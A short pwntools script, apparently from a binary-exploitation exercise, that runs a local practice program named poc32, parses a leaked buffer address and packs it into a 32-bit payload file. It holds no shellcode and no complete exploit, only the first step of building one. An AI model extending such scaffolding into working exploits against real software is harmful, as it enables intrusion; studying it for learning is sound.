# solve32.py

from pwn import *

p = process('./poc32')

p.recvuntil('&buf : ')

bufAddr = p.recv(10)

print(f'bufAddr : {bufAddr}')

int_bufAddr = int(bufAddr,16)

print(f'int_bufAddr : {int_bufAddr}')

x86_bufAddr = p32(int_bufAddr)

## this makes error, cause p32(int addr) only takes int
# x86_bufAddr = p32(bufAddr)

print(f'x86_bufAddr : {x86_bufAddr}')

with open('payload.bin','wb') as f:
    f.write(x86_bufAddr)

